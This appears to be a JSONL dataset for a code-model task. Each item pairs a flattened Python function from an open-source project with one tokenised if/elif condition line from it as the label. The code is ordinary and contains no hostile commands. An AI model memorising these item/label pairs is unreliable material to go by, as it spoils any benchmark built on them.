{"input": "def write_text(self, text): \"\"\"Writes re-indented text into the buffer.\"\"\" should_indent = False rows = [] for row in text.split(\"\\n\"): if should_indent: row = \" {}\".format(row) if \"\\b\" in row: row = row.replace(\"\\b\", \"\", 1) should_indent = True elif not len(row.strip()): should_indent = False rows.append(row) self.write(\"{}\\n\".format(\"\\n\".join(rows)))", "label": "if should_indent :"}
{"input": "def build_priorities(self, _iter, priorities): while _iter is not None: if self.files_treestore.iter_has_child(_iter): self.build_priorities(self.files_treestore.iter_children(_iter), priorities) elif not self.files_treestore.get_value(_iter, 1).endswith(os.path.sep): priorities[ self.files_treestore.get_value(_iter, 3) ] = self.files_treestore.get_value(_iter, 0) _iter = self.files_treestore.iter_next(_iter) return priorities", "label": "elif not self . files_treestore . get_value ( _iter , 1 ) . endswith ( os . path . sep ) :"}
{"input": "def _validate_sample(self, value): mask = self.support(value) if not_jax_tracer(mask): if not np.all(mask): warnings.warn( \"Out-of-support values provided to log prob method. \" \"The value argument should be within the support.\" ) return mask", "label": "if not np . all ( mask ) :"}
{"input": "def https_open(self, req): try: return self.do_open(do_connection, req) except Exception as err_msg: try: error_msg = str(err_msg.args[0]).split(\"] \")[1] + \".\" except IndexError: error_msg = str(err_msg.args[0]) + \".\" if settings.INIT_TEST == True: if settings.VERBOSITY_LEVEL < 2: print(settings.FAIL_STATUS) else: if settings.VERBOSITY_LEVEL < 1: print(\"\") print(settings.print_critical_msg(error_msg)) raise SystemExit()", "label": "if settings . VERBOSITY_LEVEL < 2 :"}
{"input": "def add_party(self, party_type, party): party_doc = frappe.new_doc(party_type) if party_type == \"Customer\": party_doc.customer_name = party else: supplier_group = frappe.db.get_single_value(\"Buying Settings\", \"supplier_group\") if not supplier_group: frappe.throw(_(\"Please Set Supplier Group in Buying Settings.\")) party_doc.supplier_name = party party_doc.supplier_group = supplier_group party_doc.flags.ignore_mandatory = True party_doc.save(ignore_permissions=True)", "label": "if not supplier_group :"}
{"input": "def get_polymorphic_model(data): for model in itervalues(models): polymorphic = model.opts.polymorphic if polymorphic: polymorphic_key = polymorphic if isinstance(polymorphic_key, bool): polymorphic_key = \"type\" if data.get(polymorphic_key) == model.__name__: return model raise ImproperlyConfigured(u\"No model found for data: {!r}\".format(data))", "label": "if polymorphic :"}
{"input": "def cleanup_expired_revoked_tokens(): \"\"\"Remove tokens that have now expired from the revoked token table.\"\"\" revoked_tokens = db.session.query(RevokedToken).all() for revoked_token in revoked_tokens: if Journalist.validate_token_is_not_expired_or_invalid(revoked_token.token): pass # The token has not expired, we must keep in the revoked token table. else: # The token is no longer valid, remove from the revoked token table. db.session.delete(revoked_token) db.session.commit()", "label": "if Journalist . validate_token_is_not_expired_or_invalid ( revoked_token . token ) :"}
{"input": "def matches_filter(key, values): if key == \"location\": if location_type in (\"availability-zone\", \"availability-zone-id\"): return offering.get(\"Location\") in values elif location_type == \"region\": return any(v for v in values if offering.get(\"Location\").startswith(v)) else: return False elif key == \"instance-type\": return offering.get(\"InstanceType\") in values else: return False", "label": "elif location_type == \"region\" :"}
{"input": "def autoname(self): naming_method = frappe.db.get_value(\"HR Settings\", None, \"emp_created_by\") if not naming_method: throw(_(\"Please setup Employee Naming System in Human Resource > HR Settings\")) else: if naming_method == \"Naming Series\": set_name_by_naming_series(self) elif naming_method == \"Employee Number\": self.name = self.employee_number elif naming_method == \"Full Name\": self.set_employee_name() self.name = self.employee_name self.employee = self.name", "label": "elif naming_method == \"Full Name\" :"}
{"input": "def readHexStringFromStream(stream): stream.read(1) txt = \"\" x = b_(\"\") while True: tok = readNonWhitespace(stream) if not tok: # stream has truncated prematurely raise PdfStreamError(\"Stream has ended unexpectedly\") if tok == b_(\">\"): break x += tok if len(x) == 2: txt += chr(int(x, base=16)) x = b_(\"\") if len(x) == 1: x += b_(\"0\") if len(x) == 2: txt += chr(int(x, base=16)) return createStringObject(b_(txt))", "label": "if len ( x ) == 2 :"}
{"input": "def test_technical_on(self): # Turn everything on data = { \"developer_comments\": \"Test comment!\", \"whiteboard-public\": \"Whiteboard info.\", } response = self.client.post(self.technical_edit_url, data) assert response.context[\"form\"].errors == {} addon = self.get_addon() for k in data: if k == \"developer_comments\": assert str(getattr(addon, k)) == str(data[k]) elif k == \"whiteboard-public\": assert str(addon.whiteboard.public) == str(data[k]) else: assert getattr(addon, k) == (data[k] == \"on\")", "label": "elif k == \"whiteboard-public\" :"}
{"input": "def create_season_posters(self, show_obj, force=False): if self.season_posters and show_obj: result = [] for ep_obj in show_obj.episodes: if not self._has_season_poster(show_obj, ep_obj.season) or force: sickrage.app.log.debug( \"Metadata provider \" + self.name + \" creating season posters for \" + show_obj.name ) result = result + [self.save_season_poster(show_obj, ep_obj.season)] return all(result) return False", "label": "if not self . _has_season_poster ( show_obj , ep_obj . season ) or force :"}
{"input": "def get_prefixes(self, guild: Optional[discord.Guild] = None) -> List[str]: ret: List[str] gid: Optional[int] = guild.id if guild else None if gid in self._cached: ret = self._cached[gid].copy() else: if gid is not None: ret = await self._config.guild_from_id(gid).prefix() if not ret: ret = await self.get_prefixes(None) else: ret = self._global_prefix_overide or (await self._config.prefix()) self._cached[gid] = ret.copy() return ret", "label": "if not ret :"}
{"input": "def checkUnchangedIvars(obj, d, exceptions=None): if not exceptions: exceptions = [] ok = True for key in d: if key not in exceptions: if getattr(obj, key) != d.get(key): g.trace( \"changed ivar: %s old: %s new: %s\" % (key, repr(d.get(key)), repr(getattr(obj, key))) ) ok = False return ok", "label": "if getattr ( obj , key ) != d . get ( key ) :"}
{"input": "def validate_ip(address): try: if socket.inet_aton(address): if len(address.split(\".\")) == 4: debug_msg(\"setcore\", \"this is a valid IP address\", 5) return True else: print_error(\"This is not a valid IP address...\") raise socket.error else: raise socket_error except socket.error: return False", "label": "if len ( address . split ( \".\" ) ) == 4 :"}
{"input": "def kernel(x, y): diff = safe_norm(x - y, ord=2) if self._normed() and x.ndim >= 1 else x - y kernel_res = jnp.exp(-(diff ** 2) / bandwidth) if self._mode == \"matrix\": if self.matrix_mode == \"norm_diag\": return kernel_res * jnp.identity(x.shape[0]) else: return jnp.diag(kernel_res) else: return kernel_res", "label": "if self . matrix_mode == \"norm_diag\" :"}
{"input": "def __init__(self, transforms): assert isinstance(transforms, collections.abc.Sequence) self.transforms = [] for transform in transforms: if isinstance(transform, dict): transform = build_from_cfg(transform, PIPELINES) self.transforms.append(transform) elif callable(transform): self.transforms.append(transform) else: raise TypeError(\"transform must be callable or a dict\")", "label": "elif callable ( transform ) :"}
{"input": "def translate( self, message: str, plural_message: Optional[str] = None, count: Optional[int] = None, ) -> str: if plural_message is not None: assert count is not None if count != 1: message = plural_message message_dict = self.translations.get(\"plural\", {}) else: message_dict = self.translations.get(\"singular\", {}) else: message_dict = self.translations.get(\"unknown\", {}) return message_dict.get(message, message)", "label": "if count != 1 :"}
{"input": "def install_requires(cls, reduced_dependencies): install_requires = OrderedSet() for dep in reduced_dependencies: if cls.is_requirements(dep): for req in dep.payload.requirements: install_requires.add(str(req.requirement)) elif cls.has_provides(dep): install_requires.add(dep.provides.key) return install_requires", "label": "if cls . is_requirements ( dep ) :"}
{"input": "def doit(): recipes_path = expanduser(\"recipes.pprint\") recipe_dicts = eval(open(recipes_path).read()) for r in recipe_dicts: for key in r.keys(): if key not in (\"desc\", \"comments\"): del r[key] for c in r[\"comments\"]: for key in c.keys(): if key not in (\"comment\", \"title\"): del c[key] f = open(\"stripped.pprint\", \"w\") f.write(pformat(recipe_dicts)) f.close()", "label": "if key not in ( \"comment\" , \"title\" ) :"}
{"input": "def setup(self, name): value = self.default if self.environ: full_environ_name = self.full_environ_name(name) if full_environ_name in os.environ: value = self.to_python(os.environ[full_environ_name]) elif self.environ_required: raise ValueError( \"Value {0!r} is required to be set as the \" \"environment variable {1!r}\".format(name, full_environ_name) ) self.value = value return value", "label": "if full_environ_name in os . environ :"}
{"input": "def get_art_abs(story_file): lines = read_text_file(story_file) lines = [line.lower() for line in lines] lines = [fix_missing_period(line) for line in lines] article_lines = [] highlights = [] next_is_highlight = False for idx, line in enumerate(lines): if line == \"\": continue # empty line elif line.startswith(\"@highlight\"): next_is_highlight = True elif next_is_highlight: highlights.append(line) else: article_lines.append(line) article = \" \".join(article_lines) abstract = \" \".join(highlights) return article, abstract", "label": "elif line . startswith ( \"@highlight\" ) :"}
{"input": "def _ordered_tag_specs( entity_tag_specs: Optional[List[EntityTagSpec]], ) -> List[EntityTagSpec]: \"\"\"Ensure that order of entity tag specs matches CRF layer order.\"\"\" if entity_tag_specs is None: return [] crf_order = [ ENTITY_ATTRIBUTE_TYPE, ENTITY_ATTRIBUTE_ROLE, ENTITY_ATTRIBUTE_GROUP, ] ordered_tag_spec = [] for tag_name in crf_order: for tag_spec in entity_tag_specs: if tag_name == tag_spec.tag_name: ordered_tag_spec.append(tag_spec) return ordered_tag_spec", "label": "if tag_name == tag_spec . tag_name :"}
{"input": "def checkDrag(self, root, target): \"\"\"Return False if target is any descendant of root.\"\"\" c = self message = \"Can not drag a node into its descendant tree.\" for z in root.subtree(): if z == target: if g.app.unitTesting: g.app.unitTestDict[\"checkMoveWithParentWithWarning\"] = True else: c.alert(message) return False return True", "label": "if z == target :"}
{"input": "def get_adapter(self, pattern=None): adapters = self.get_adapters() if pattern is None: if len(adapters): return adapters[0] else: raise DBusNoSuchAdapterError(\"No adapter(s) found\") else: for adapter in adapters: path = adapter.get_object_path() if path.endswith(pattern) or adapter[\"Address\"] == pattern: return adapter raise DBusNoSuchAdapterError(\"No adapters found with pattern: %s\" % pattern)", "label": "if len ( adapters ) :"}
{"input": "def __init__(self, children, quiet_exceptions=()): self.keys = None if isinstance(children, dict): self.keys = list(children.keys()) children = children.values() self.children = [] for i in children: if not isinstance(i, YieldPoint): i = convert_yielded(i) if is_future(i): i = YieldFuture(i) self.children.append(i) assert all(isinstance(i, YieldPoint) for i in self.children) self.unfinished_children = set(self.children) self.quiet_exceptions = quiet_exceptions", "label": "if is_future ( i ) :"}
{"input": "def _make_callback(self): callback = self.callback for plugin in self.all_plugins(): try: if hasattr(plugin, \"apply\"): callback = plugin.apply(callback, self) else: callback = plugin(callback) except RouteReset: # Try again with changed configuration. return self._make_callback() if not callback is self.callback: update_wrapper(callback, self.callback) return callback", "label": "if not callback is self . callback :"}
{"input": "def _check_conflict(func, other_funcs): if steps[func]: for other_func in other_funcs: if steps[other_func] and other_func != func: raise ValueError(\"Can't specify both %s and %s\" % (func, other_func))", "label": "if steps [ other_func ] and other_func != func :"}
{"input": "def shutdown(self, cleanup=True): super(LocalDistributedRunner, self).shutdown() global _dummy_cpu_actor global _dummy_cuda_actor if cleanup: if _dummy_cpu_actor or _dummy_cuda_actor: assert not self.is_actor(), \"Actor shouldn't have a \" \"dummy actor.\" if _dummy_cpu_actor: ray.kill(_dummy_cpu_actor) if _dummy_cuda_actor: ray.kill(_dummy_cuda_actor) _dummy_cpu_actor = None _dummy_cuda_actor = None", "label": "if _dummy_cpu_actor :"}
{"input": "def _publish(self, data): retry = True while True: try: if not retry: self._redis_connect() return self.redis.publish(self.channel, pickle.dumps(data)) except redis.exceptions.ConnectionError: if retry: logger.error(\"Cannot publish to redis... retrying\") retry = False else: logger.error(\"Cannot publish to redis... giving up\") break", "label": "if retry :"}
{"input": "def simulate_policy(args): data = torch.load(args.file) policy = data[\"evaluation/policy\"] env = data[\"evaluation/env\"] print(\"Policy loaded\") if args.gpu: set_gpu_mode(True) policy.cuda() while True: path = rollout( env, policy, max_path_length=args.H, render=True, ) if hasattr(env, \"log_diagnostics\"): env.log_diagnostics([path]) logger.dump_tabular()", "label": "if hasattr ( env , \"log_diagnostics\" ) :"}
{"input": "def get_bucket_latest_versions(self, bucket_name): versions = self.get_bucket_versions(bucket_name) latest_modified_per_key = {} latest_versions = {} for version in versions: name = version.name last_modified = version.last_modified version_id = version.version_id latest_modified_per_key[name] = max( last_modified, latest_modified_per_key.get(name, datetime.datetime.min) ) if last_modified == latest_modified_per_key[name]: latest_versions[name] = version_id return latest_versions", "label": "if last_modified == latest_modified_per_key [ name ] :"}
{"input": "def _get_ntp_entity(self, peer_type): ntp_entities = {} command = \"show ntp peers\" ntp_peers_table = self._get_command_table(command, \"TABLE_peers\", \"ROW_peers\") for ntp_peer in ntp_peers_table: if ntp_peer.get(\"serv_peer\", \"\").strip() != peer_type: continue peer_addr = napalm.base.helpers.ip(ntp_peer.get(\"PeerIPAddress\").strip()) ntp_entities[peer_addr] = {} return ntp_entities", "label": "if ntp_peer . get ( \"serv_peer\" , \"\" ) . strip ( ) != peer_type :"}
{"input": "def kaiming_init( module, a=0, mode=\"fan_out\", nonlinearity=\"relu\", bias=0, distribution=\"normal\" ): assert distribution in [\"uniform\", \"normal\"] if hasattr(module, \"weight\") and module.weight is not None: if distribution == \"uniform\": nn.init.kaiming_uniform_( module.weight, a=a, mode=mode, nonlinearity=nonlinearity ) else: nn.init.kaiming_normal_( module.weight, a=a, mode=mode, nonlinearity=nonlinearity ) if hasattr(module, \"bias\") and module.bias is not None: nn.init.constant_(module.bias, bias)", "label": "if distribution == \"uniform\" :"}
{"input": "def _get_arguments( self, name: str, source: Dict[str, List[bytes]], strip: bool = True ) -> List[str]: values = [] for v in source.get(name, []): s = self.decode_argument(v, name=name) if isinstance(s, unicode_type): # Get rid of any weird control chars (unless decoding gave # us bytes, in which case leave it alone) s = RequestHandler._remove_control_chars_regex.sub(\" \", s) if strip: s = s.strip() values.append(s) return values", "label": "if isinstance ( s , unicode_type ) :"}
{"input": "def __str__(self): s = \"{\" sep = \"\" for k, v in self.iteritems(): s += sep if type(k) == str: s += \"'%s'\" % k else: s += str(k) s += \": \" if type(v) == str: s += \"'%s'\" % v else: s += str(v) sep = \", \" s += \"}\" return s", "label": "if type ( v ) == str :"}
{"input": "def contains(self, other_route): if isinstance(other_route, list): return self.to_list()[0 : len(other_route)] == other_route # This only works before merging assert len(other_route.outgoing) <= 1, \"contains(..) cannot be called after a merge\" assert len(self.outgoing) <= 1, \"contains(..) cannot be called after a merge\" if other_route.task_spec == self.task_spec: if other_route.outgoing and self.outgoing: return self.outgoing[0].contains(other_route.outgoing[0]) elif self.outgoing: return True elif not other_route.outgoing: return True return False", "label": "elif self . outgoing :"}
{"input": "def iter_help(cls): for variable_name, value in sorted(cls.__dict__.items()): if not variable_name.startswith(\"PEX_\"): continue variable_type, variable_text = cls.process_pydoc(getattr(value, \"__doc__\")) yield variable_name, variable_type, variable_text", "label": "if not variable_name . startswith ( \"PEX_\" ) :"}
{"input": "def _clean_dict(json_dict): for key, value in json_dict.items(): if isinstance(value, list): json_dict[key] = list(OrderedSet(map(_clean_string, value))) elif isinstance(value, dict): json_dict[key] = _clean_dict(value) return OrderedDict(filter(lambda x: x[1], json_dict.items()))", "label": "elif isinstance ( value , dict ) :"}
{"input": "def _createdir(self): if not os.path.exists(self._dir): try: os.makedirs(self._dir, 0o700) except OSError as e: if e.errno != errno.EEXIST: raise EnvironmentError( \"Cache directory '%s' does not exist \" \"and could not be created'\" % self._dir )", "label": "if e . errno != errno . EEXIST :"}
{"input": "def JobWait(self, waiter): # type: (Waiter) -> wait_status_t # wait builtin can be interrupted while True: # Don't retry result = waiter.WaitForOne(False) if result > 0: # signal return wait_status.Cancelled(result) if result == -1: # nothing to wait for break if self.state != job_state_e.Running: break return wait_status.Proc(self.status)", "label": "if result > 0 :"}
{"input": "def _deserialize_pickle5_data(self, data): try: in_band, buffers = unpack_pickle5_buffers(data) if len(buffers) > 0: obj = pickle.loads(in_band, buffers=buffers) else: obj = pickle.loads(in_band) # cloudpickle does not provide error types except pickle.pickle.PicklingError: raise DeserializationError() return obj", "label": "if len ( buffers ) > 0 :"}
{"input": "def svgGetPaths(svgCode): doc = xmlparseString(svgCode) svg = doc.documentElement paths = findPathNodes(svg) isFigmaSVG = svgCode.find(\"Figma</desc>\") != -1 if len(paths) == 0: return paths, (0, 0) paths2 = [] for path in paths: id = path.getAttribute(\"id\") if not isFigmaSVG or (id is None or id.find(\"stroke\") == -1): tr = nodeTranslation(path) d = path.getAttribute(\"d\") paths2.append((d, tr)) return paths2, isFigmaSVG", "label": "if not isFigmaSVG or ( id is None or id . find ( \"stroke\" ) == - 1 ) :"}
{"input": "def get_track_id_from_json(item): \"\"\"Try to extract video Id from various response types\"\"\" fields = [ \"contentDetails/videoId\", \"snippet/resourceId/videoId\", \"id/videoId\", \"id\", ] for field in fields: node = item for p in field.split(\"/\"): if node and isinstance(node, dict): node = node.get(p) if node: return node return \"\"", "label": "if node and isinstance ( node , dict ) :"}
{"input": "def save(self): self._idx_lock.acquire() try: if self._is_idx_dirty: if not exists(self.base_dir): self._mk_dbdir() self.db.save_pickle( join(self.base_dir, \"dirs_from_basename\"), self._dirs_from_basename ) self._is_idx_dirty = False finally: self._idx_lock.release()", "label": "if not exists ( self . base_dir ) :"}
{"input": "def _init_from_response(self, response): self.id = response[\"id\"] self.uri = response.get(\"mongodb_auth_uri\", response[\"mongodb_uri\"]) for member in response[\"members\"]: if member[\"state\"] == 1: self.primary = Server(member[\"server_id\"], member[\"host\"]) elif member[\"state\"] == 2: self.secondary = Server(member[\"server_id\"], member[\"host\"]) return self", "label": "elif member [ \"state\" ] == 2 :"}
{"input": "def verify_secret_key(request): \"Verifies secret key for a request\" if request.user.username: # always allow authenticated users return True else: key = request.GET[\"secret\"] user_id, secret = key.split(\".\", 1) try: profile = User.objects.get(pk=user_id) except: return False if key == get_secret_key(request, profile): request.user = profile.user return True return False", "label": "if key == get_secret_key ( request , profile ) :"}
{"input": "def compute(self, split): rd = random.Random(self.seed + split.index) if self.withReplacement: olddata = list(self.prev.iterator(split)) sampleSize = int(math.ceil(len(olddata) * self.frac)) for i in range(sampleSize): yield rd.choice(olddata) else: for i in self.prev.iterator(split): if rd.random() <= self.frac: yield i", "label": "if rd . random ( ) <= self . frac :"}
{"input": "def splitIntoWords(name): wordlist = [] wordstart = 0 l = len(name) for i in range(l): c = name[i] n = None if c == \" \" or c == \"-\": n = name[wordstart:i] elif i == l - 1: n = name[wordstart : i + 1] if n: wordstart = i if c == \"-\" and n != \"\": n += \"-\" if c == \" \" or c == \"-\": wordstart = i + 1 wordlist.append(n) return wordlist", "label": "elif i == l - 1 :"}
{"input": "def check_file(f, path): if not (ignore_substring and ignore_substring in f): if substring in f: compl_path = os.path.join(path, f) if os.path.isfile(compl_path): return compl_path return False", "label": "if substring in f :"}
{"input": "def keyPressEvent(self, event): \"\"\"Add up and down arrow key events to built in functionality.\"\"\" keyPressed = event.key() if keyPressed in [Constants.UP_KEY, Constants.DOWN_KEY, Constants.TAB_KEY]: if keyPressed == Constants.UP_KEY: self.index = max(0, self.index - 1) elif keyPressed == Constants.DOWN_KEY: self.index = min(len(self.completerStrings) - 1, self.index + 1) elif keyPressed == Constants.TAB_KEY and self.completerStrings: self.tabPressed() if self.completerStrings: self.setTextToCompleterIndex() super(CueLineEdit, self).keyPressEvent(event)", "label": "elif keyPressed == Constants . DOWN_KEY :"}
{"input": "def _get_disk_size(cls, path, ignored=None): if ignored is None: ignored = [] if path in ignored: return 0 total = 0 for entry in scandir(path): if entry.is_dir(): total += cls._get_disk_size(entry.path, ignored=ignored) elif entry.is_file(): total += entry.stat().st_size return total", "label": "if entry . is_dir ( ) :"}
{"input": "def _handle_rate_limit( self, exception: RedditAPIException ) -> Optional[Union[int, float]]: for item in exception.items: if item.error_type == \"RATELIMIT\": amount_search = self._ratelimit_regex.search(item.message) if not amount_search: break seconds = int(amount_search.group(1)) if \"minute\" in amount_search.group(2): seconds *= 60 if seconds <= int(self.config.ratelimit_seconds): sleep_seconds = seconds + min(seconds / 10, 1) return sleep_seconds return None", "label": "if seconds <= int ( self . config . ratelimit_seconds ) :"}
{"input": "def validate(self): try: f = int(eval(self.setting.getValue(), {}, {})) if self.minValue is not None and f < self.minValue: return ERROR, \"This setting should not be below \" + str(self.minValue) if self.maxValue is not None and f > self.maxValue: return ERROR, \"This setting should not be above \" + str(self.maxValue) return SUCCESS, \"\" except (ValueError, SyntaxError, TypeError, NameError): return ( ERROR, '\"' + str(self.setting.getValue()) + '\" is not a valid whole number or expression', )", "label": "if self . minValue is not None and f < self . minValue :"}
{"input": "def rename(self, remote_name, new_remote_name): remotes = self.load_remotes() remotes.rename(remote_name, new_remote_name) with self._cache.editable_packages.disable_editables(): for ref in self._cache.all_refs(): with self._cache.package_layout(ref).update_metadata() as metadata: if metadata.recipe.remote == remote_name: metadata.recipe.remote = new_remote_name for pkg_metadata in metadata.packages.values(): if pkg_metadata.remote == remote_name: pkg_metadata.remote = new_remote_name remotes.save(self._filename)", "label": "if metadata . recipe . remote == remote_name :"}
{"input": "def _convert_idx(self, idx): graph_idx = 0 node_idx = idx for i in range(len(self.graphs)): if node_idx < self.graphs[i].number_of_nodes(): graph_idx = i break else: node_idx -= self.graphs[i].number_of_nodes() return graph_idx, node_idx", "label": "if node_idx < self . graphs [ i ] . number_of_nodes ( ) :"}
{"input": "def emit_pre_migrate_signal(verbosity, interactive, db, **kwargs): # Emit the pre_migrate signal for every application. for app_config in apps.get_app_configs(): if app_config.models_module is None: continue if verbosity >= 2: print(\"Running pre-migrate handlers for application %s\" % app_config.label) models.signals.pre_migrate.send( sender=app_config, app_config=app_config, verbosity=verbosity, interactive=interactive, using=db, **kwargs )", "label": "if app_config . models_module is None :"}
{"input": "def slice(self, slice): gridscope = GridScope(globals=self.globals) for key in self.user_added: value = self[key] if isinstance(value, np.ndarray): grid = value sliced = np.sum(grid[slice, ...], axis=0) logger.debug(\"sliced %s from %r to %r\", key, grid.shape, sliced.shape) gridscope[key] = sliced else: gridscope[key] = value return gridscope", "label": "if isinstance ( value , np . ndarray ) :"}
{"input": "def get_last_tagged(self): if not self.last_tagged: last = datetime(1970, 1, 1) for tag in self.tags: if tag.last_seen > last: last = tag.last_seen self.update(set__last_tagged=last) return last else: return self.last_tagged", "label": "if tag . last_seen > last :"}
{"input": "def recalculate_user_disk_usage(app, **kwargs): user_id = kwargs.get(\"user_id\", None) sa_session = app.model.context if user_id: user = sa_session.query(app.model.User).get(app.security.decode_id(user_id)) if user: user.calculate_and_set_disk_usage() else: log.error( \"Recalculate user disk usage task failed, user %s not found\" % user_id ) else: log.error(\"Recalculate user disk usage task received without user_id.\")", "label": "if user :"}
{"input": "def log_items(self, interface, action, media, items): if not items: return # Log each item for item in items: if not item: continue log.info( \"[%s:%s](%s) %r (%r)\", interface, action, media, item.get(\"title\"), item.get(\"year\"), ) if media == \"shows\": # Log each episode self.log_episodes(item)", "label": "if not item :"}
{"input": "def test_unbiased_coin_has_no_second_order(): counts = Counter() for i in range(256): buf = bytes([i]) data = ConjectureData.for_buffer(buf) result = cu.biased_coin(data, 0.5) if data.buffer == buf: counts[result] += 1 assert counts[False] == counts[True] > 0", "label": "if data . buffer == buf :"}
{"input": "def gettempfilename(suffix): \"\"\"Returns a temporary filename\"\"\" if \"_\" in os.environ: # tempfile.mktemp() crashes on some Wine versions (the one of Ubuntu 12.04 particularly) if os.environ[\"_\"].find(\"wine\") >= 0: tmpdir = \".\" if \"TMP\" in os.environ: tmpdir = os.environ[\"TMP\"] import time import random random.seed(time.time()) random_part = \"file%d\" % random.randint(0, 1000000000) return os.path.join(tmpdir, random_part + suffix) return tempfile.mktemp(suffix)", "label": "if os . environ [ \"_\" ] . find ( \"wine\" ) >= 0 :"}
{"input": "def _get_functionapp_runtime_language( self, app_settings ): # pylint: disable=no-self-use functions_worker_runtime = [ setting[\"value\"] for setting in app_settings if setting[\"name\"] == \"FUNCTIONS_WORKER_RUNTIME\" ] if functions_worker_runtime: functionapp_language = functions_worker_runtime[0] if SUPPORTED_LANGUAGES.get(functionapp_language) is not None: return SUPPORTED_LANGUAGES[functionapp_language] raise LanguageNotSupportException(functionapp_language) return None", "label": "if SUPPORTED_LANGUAGES . get ( functionapp_language ) is not None :"}
{"input": "def seek(self, offset, whence=io.SEEK_SET): if self.mode == WRITE: if whence != io.SEEK_SET: if whence == io.SEEK_CUR: offset = self.offset + offset else: raise ValueError(\"Seek from end not supported\") if offset < self.offset: raise OSError(\"Negative seek in write mode\") count = offset - self.offset chunk = bytes(1024) for i in range(count // 1024): self.write(chunk) self.write(bytes(count % 1024)) elif self.mode == READ: self._check_not_closed() return self._buffer.seek(offset, whence) return self.offset", "label": "if offset < self . offset :"}
{"input": "def stop(self): \"\"\"Stop the HTTP server.\"\"\" if self.running: # stop() MUST block until the server is *truly* stopped. self.httpserver.stop() # Wait for the socket to be truly freed. if isinstance(self.bind_addr, tuple): portend.free(*self.bound_addr, timeout=Timeouts.free) self.running = False self.bus.log(\"HTTP Server %s shut down\" % self.httpserver) else: self.bus.log(\"HTTP Server %s already shut down\" % self.httpserver)", "label": "if isinstance ( self . bind_addr , tuple ) :"}
{"input": "def dump_json(testcase, json_file): \"\"\"dump HAR entries to json testcase\"\"\" logger.info(\"dump testcase to JSON format.\") with open(json_file, \"w\", encoding=\"utf-8\") as outfile: my_json_str = json.dumps(testcase, ensure_ascii=False, indent=4) if isinstance(my_json_str, bytes): my_json_str = my_json_str.decode(\"utf-8\") outfile.write(my_json_str) logger.info(\"Generate JSON testcase successfully: {}\".format(json_file))", "label": "if isinstance ( my_json_str , bytes ) :"}
{"input": "def find_comment(line): \"\"\"Finds the index of a comment # and returns None if not found\"\"\" instring, instring_char = False, \"\" for i, char in enumerate(line): if char in ('\"', \"'\"): if instring: if char == instring_char: instring = False instring_char = \"\" else: instring = True instring_char = char elif char == \"#\": if not instring: return i return None", "label": "if char == instring_char :"}
{"input": "def _requests_to_follow(self, response): if not isinstance(response, HtmlResponse): return seen = set() for n, rule in enumerate(self._rules): links = [ lnk for lnk in rule.link_extractor.extract_links(response) if lnk not in seen ] if links and rule.process_links: links = rule.process_links(links) for link in links: seen.add(link) request = self._build_request(n, link) yield rule._process_request(request, response)", "label": "if links and rule . process_links :"}
{"input": "def _process_iter(self, line_iter): samples = [] buf = [] for line in line_iter: if not buf and line.startswith(\"#\") and self._has_comment: continue line = line.split() if line: buf.append(line) elif buf: samples.append(tuple(map(list, zip(*buf)))) buf = [] if buf: samples.append(tuple(map(list, zip(*buf)))) return samples", "label": "if line :"}
{"input": "def _set_input_expanded(self, inp, expand, scroll=True): getobj = self._builder.get_object arrow = getobj(\"by%s_expander_arrow\" % (inp.name,)) grid = getobj(\"by%s_curve_grid\" % (inp.name,)) if expand: arrow.set_property(\"arrow-type\", Gtk.ArrowType.DOWN) grid.show_all() if scroll: GLib.idle_add(self._scroll_setting_editor, grid) else: arrow.set_property(\"arrow-type\", Gtk.ArrowType.RIGHT) grid.hide()", "label": "if scroll :"}
{"input": "def extract_groups(self, text: str, language_code: str): previous = None group = 1 groups = [] words = [] ignored = IGNORES.get(language_code, {}) for word in NON_WORD.split(text): if not word: continue if word not in ignored and len(word) >= 2: if previous == word: group += 1 elif group > 1: groups.append(group) words.append(previous) group = 1 previous = word if group > 1: groups.append(group) words.append(previous) return groups, words", "label": "elif group > 1 :"}
{"input": "def add_field_to_csv_file(fieldName, fieldNameMap, fieldsList, fieldsTitles, titles): for ftList in fieldNameMap[fieldName]: if ftList not in fieldsTitles: fieldsList.append(ftList) fieldsTitles[ftList] = ftList add_titles_to_csv_file([ftList], titles)", "label": "if ftList not in fieldsTitles :"}
{"input": "def get_transform(self, img): check_dtype(img) assert img.ndim in [2, 3], img.ndim from .transform import LazyTransform, TransformList # The next augmentor requires the previous one to finish. # So we have to use LazyTransform tfms = [] for idx, a in enumerate(self.augmentors): if idx == 0: t = a.get_transform(img) else: t = LazyTransform(a.get_transform) if isinstance(t, TransformList): tfms.extend(t.tfms) else: tfms.append(t) return TransformList(tfms)", "label": "if isinstance ( t , TransformList ) :"}
{"input": "def __init__(self, template, context, body_stream=None): if body_stream is None: if context.environment.is_async: raise RuntimeError( \"Async mode requires a body stream \" \"to be passed to a template module. Use \" \"the async methods of the API you are \" \"using.\" ) body_stream = list(template.root_render_func(context)) self._body_stream = body_stream self.__dict__.update(context.get_exported()) self.__name__ = template.name", "label": "if context . environment . is_async :"}
{"input": "def url_locations(urls, faker=False): locations = [] for url in urls: if faker: response = request.urlopen(request.Request(url, headers=fake_headers), None) else: response = request.urlopen(request.Request(url)) locations.append(response.url) return locations", "label": "if faker :"}
{"input": "def wait_services_ready(selectors, min_counts, count_fun, timeout=None): readies = [0] * len(selectors) start_time = time.time() while True: all_satisfy = True for idx, selector in enumerate(selectors): if readies[idx] < min_counts[idx]: all_satisfy = False readies[idx] = count_fun(selector) break if all_satisfy: break if timeout and timeout + start_time < time.time(): raise TimeoutError(\"Wait cluster start timeout\") time.sleep(1)", "label": "if readies [ idx ] < min_counts [ idx ] :"}
{"input": "def sanitize_args(a): try: args, kwargs = a if isinstance(args, tuple) and isinstance(kwargs, dict): return args, dict(kwargs) except (TypeError, ValueError): args, kwargs = (), {} if a is not None: if isinstance(a, dict): args = tuple() kwargs = a elif isinstance(a, tuple): if isinstance(a[-1], dict): args, kwargs = a[0:-1], a[-1] else: args = a kwargs = {} return args, kwargs", "label": "if isinstance ( a [ - 1 ] , dict ) :"}
{"input": "def _override_options(options, **overrides): \"\"\"Override options.\"\"\" for opt, val in overrides.items(): passed_value = getattr(options, opt, _Default()) if opt in (\"ignore\", \"select\") and passed_value: value = process_value(opt, passed_value.value) value += process_value(opt, val) setattr(options, opt, value) elif isinstance(passed_value, _Default): setattr(options, opt, process_value(opt, val))", "label": "elif isinstance ( passed_value , _Default ) :"}
